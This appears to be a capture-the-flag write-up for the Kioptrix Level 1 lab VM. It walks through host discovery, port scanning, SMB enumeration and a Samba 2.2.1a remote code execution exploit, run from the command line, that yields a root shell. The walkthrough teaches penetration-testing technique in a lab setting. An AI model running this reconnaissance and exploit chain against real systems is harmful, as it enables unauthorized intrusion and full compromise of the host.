# Kioptrix_Level_1 writeup
After booting the vulnerable vm and connecting it to bridged interface , we scan using
\
```bash
sudo netdiscover -r 10.201.61.14/24
```
\
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.201.61.58    d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.106   00:0c:29:c0:88:ed      1      60  VMware, Inc.                                                                                                                                                   
 10.201.61.124   a2:45:98:5b:74:77      1      60  Unknown vendor
```
\
now we scan for open ports using 
\
```bash
rustscan -a 10.201.61.106
```
\
We see many ports being open
\
```bash
Open 10.201.61.106:22
Open 10.201.61.106:80
Open 10.201.61.106:111
Open 10.201.61.106:443
Open 10.201.61.106:139
Open 10.201.61.106:1024
```
\
next lets run nmap to fingerprint the services
\
we see
```bash
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
```
\
i checked both websites on port 80 and 443 , but it led no where , so i used enum4linux 
```bash
enum4linux -a 10.201.61.106
```
\
it gave a lot of info on smb from it 
\
```bash
Server 10.201.61.106 allows sessions using username '', password ''

   Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

```
\
so next i used metasploit's smb version finder 
\
```bash
msf auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf auxiliary(scanner/smb/smb_version) > set rhosts 10.201.61.106
rhosts => 10.201.61.106
msf auxiliary(scanner/smb/smb_version) > run
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.201.61.106:139     -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.201.61.106         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
\
we find that the version is Samba 2.2.1a
\
Now , we check for any vulnerabilities using searchsploit
\
```bash
searchsploit Samba 2.2.1a                                          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                              | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                         | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                             | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ------------------------
```
\
And we see a remote code execution vuln, so lets try that after compiling
\
```
./10 -v -b 0 -c 10.201.61.14 10.201.61.106
```
\
and we get a root shell
\
```bash
 ./10 -v -b 0 -c 10.201.61.14 10.201.61.106

samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
id
uid=0(root) gid=0(root) groups=99(nobody)

```
The End 
\
Thank you for reading till the End
